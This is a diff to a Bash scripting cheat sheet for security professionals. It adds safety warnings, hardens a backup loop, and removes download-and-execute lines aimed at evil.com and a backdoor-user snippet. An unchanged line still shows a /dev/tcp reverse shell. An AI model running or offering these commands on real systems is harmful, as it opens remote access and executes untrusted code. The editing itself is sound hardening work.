@@ -1,5 +1,8 @@
 # Bash Scripting Cheat Sheet
 
+> [!IMPORTANT]
+> **Reviewed October 31, 2026.** Bash snippets are examples, not production-hardened scripts. Run `bash -n script.sh` and `shellcheck script.sh`; quote expansions, validate input and protect credentials. Do **not** execute remote scripts directly from an unreviewed URL. Offensive lab snippets further down are **not** general-purpose admin commands. Start with the [Linux cheat sheet](../../Documentation/LinuxCheatSheet.md) or [security script pinning policy](../PINNING.md) when building installers.
+
 
 ## 🎯 Purpose
 Bash scripting reference for security professionals - covering the patterns, syntax, and idioms commonly needed for writing security automation scripts, log parsing tools, and recon helpers.
@@ -224,10 +227,10 @@ if [[ ! -d "${DIR_SEARCH}" ]]; then
 fi
 
 # Create backup directory
-[[ ! -d "${DIR_BACKUP}" ]] && mkdir "${DIR_BACKUP}"
+mkdir -p -- "${DIR_BACKUP}"
 
 # Copy readable files
-while read -r file; do 
+while IFS= read -r file; do 
     echo "Copying ${file} to ${DIR_BACKUP}"
     cp -f "${file}" "${DIR_BACKUP}"
 done < <(find "${DIR_SEARCH}" -type f -readable 2>/dev/null)
@@ -682,16 +685,16 @@ echo "dGV4dAo=" | base64 -d
 # URL encode
 printf '%s' "text with spaces" | jq -sRr @uri
 
-# Download and execute
-curl -s http://evil.com/script.sh | bash
-wget -qO- http://evil.com/script.sh | bash
+# Download only after verifying the HTTPS source and exact version.
+# Then inspect and check its published signature/checksum BEFORE running.
+# No examples here execute unknown network content directly.
 
 # Reverse shell
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
-# Create backdoor user
-useradd -m -s /bin/bash -G sudo backdoor
-echo "backdoor:password" | chpasswd
+# No backdoor accounts in general-purpose automation.
+# Use approved account provisioning and least-privilege group assignments.
+# Do not set a hard-coded password in a script or create unapproved accounts.
 ```
 
 ---
@@ -732,7 +735,7 @@ ldapsearch                           # LDAP queries
 
 ## Quick Tips
 
-- Use `"${variable}"` to prevent word splitting
+- Use `"${variable}"` to prevent unintended word splitting in ordinary command arguments (arrays and patterns have different rules)
 - Use `[[` instead of `[` for better syntax
 - Always quote variables: `"${var}"`
 - Use `$()` instead of backticks for command substitution
@@ -740,7 +743,7 @@ ldapsearch                           # LDAP queries
 - Use `shellcheck` to validate scripts
 - Redirect errors to null: `2>/dev/null`
 - Use `timeout` to prevent hanging commands
-- Log everything: `script.sh 2>&1 | tee output.log`
+- Avoid logging secrets or personal data: `script.sh 2>&1 | tee output.log` can expose sensitive values; redact/limit logs and restrict access
 
 ---
 
